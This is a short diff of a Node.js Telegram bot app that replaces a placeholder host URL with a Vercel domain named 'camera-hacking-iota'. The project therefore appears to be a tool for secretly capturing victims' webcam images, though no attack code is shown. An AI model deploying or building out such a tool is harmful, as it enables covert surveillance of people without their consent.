@@ -16,7 +16,7 @@ app.set("view engine", "ejs");
 
 // Global config
 const bot = new TelegramBot(process.env["bot"], { polling: true });
-const hostURL = "https://your-vercel-deployment.vercel.app"; // Change this to your actual Vercel domain
+const hostURL = "https://camera-hacking-iota.vercel.app"; // Change this to your actual Vercel domain
 const use1pt = false;
 
 // Utility
